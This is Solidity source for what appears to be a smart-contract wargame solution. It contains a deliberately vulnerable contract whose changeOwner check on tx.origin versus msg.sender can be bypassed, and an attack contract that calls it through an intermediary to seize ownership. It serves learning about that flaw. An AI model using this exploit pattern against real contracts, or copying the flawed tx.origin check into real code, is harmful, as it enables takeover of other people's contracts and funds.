// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./telephoneorigins.sol";

contract Telephone {
    Telephoneorigins public origins;

    constructor(address _contract) {
        origins = Telephoneorigins(_contract);
    }

    function attack() public {
        origins.changeOwner((tx.origin));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephoneorigins {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}